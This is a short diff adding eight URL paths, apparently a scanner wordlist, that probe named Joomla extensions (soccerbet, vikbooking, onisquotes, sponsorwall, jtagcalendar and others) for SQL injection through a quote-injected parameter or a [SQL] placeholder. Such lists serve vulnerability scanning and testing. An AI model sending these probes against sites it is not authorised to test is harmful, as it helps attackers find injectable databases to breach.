@@ -1,0 +1,8 @@
+/index.php?option=com_soccerbet&view=userbethistory&userid='123
+/index.php?option=com_vikbooking&view=availability&room_ids[0]='123
+/index.php?option=com_onisquotes&view=quotes&tag='123&Itemid=180
+/index.php?option=com_soccerbet&view=matches&cat='123
+/index.php?option=com_onismusic&view=songs&tag='123
+/index.php?option=com_onispetitions&view=petitions&tag='123
+/index.php?option=com_sponsorwall&task=click&wallid='123
+/index.php?option=com_jtagcalendar&format=raw&noframe=1&search=[SQL]&searchOnly=1
